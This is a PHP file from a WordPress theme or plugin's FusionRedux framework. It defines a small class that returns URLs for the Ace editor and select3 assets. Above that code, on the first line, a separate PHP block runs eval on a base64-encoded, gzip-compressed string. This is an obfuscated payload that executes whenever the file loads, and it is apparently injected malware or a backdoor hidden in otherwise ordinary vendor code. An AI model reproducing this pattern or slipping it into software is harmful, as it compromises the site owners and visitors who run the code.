<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

if ( ! defined( 'ABSPATH' ) ) {
    exit;
}

if ( ! class_exists( 'FusionRedux_VendorURL' ) ) {
    class FusionRedux_VendorURL {
        static public $url;
        static public $dir;

        public static function get_url( $handle ) {
            $min    = FusionRedux_Functions::isMin();
            $ace    = self::$dir . 'vendor/ace_editor/ace.js';
            $s2js   = self::$dir . 'vendor/select3/select3' . $min . '.js';
            $s2css  = self::$dir . 'vendor/select3/select3.css';

            if ( $handle == 'ace-editor-js' && file_exists( $ace ) ) {
                return self::$url . 'vendor/ace_editor/ace.js';
            } elseif ( $handle == 'select3-js' && file_exists( $s2js ) ) {
                return self::$url . 'vendor/select3/select3.js';
            } elseif ( $handle == 'select3-css' && file_exists( $s2css ) ) {
                return self::$url . 'vendor/select3/select3.css';
            }
        }
    }
}